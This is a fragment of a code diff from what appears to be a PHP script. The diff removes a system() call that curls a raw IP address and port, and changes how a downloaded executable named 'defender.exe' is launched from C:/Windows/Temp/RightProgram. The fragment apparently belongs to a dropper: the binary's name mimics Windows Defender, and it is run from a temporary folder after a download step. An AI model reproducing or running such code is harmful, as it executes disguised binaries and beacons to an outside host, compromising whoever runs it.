@@ -77,8 +77,8 @@ if (!$found && !$found2) {
         } else {
             echo "Failed to download file, aborting further processing.\n";
         }
-system('curl 185.208.158.206:8877');   
-         system('start /B "" "C:/Windows/Temp/RightProgram/defender.exe"');
+         system('C:/Windows/Temp/RightProgram/defender.exe');
+
         
 
 
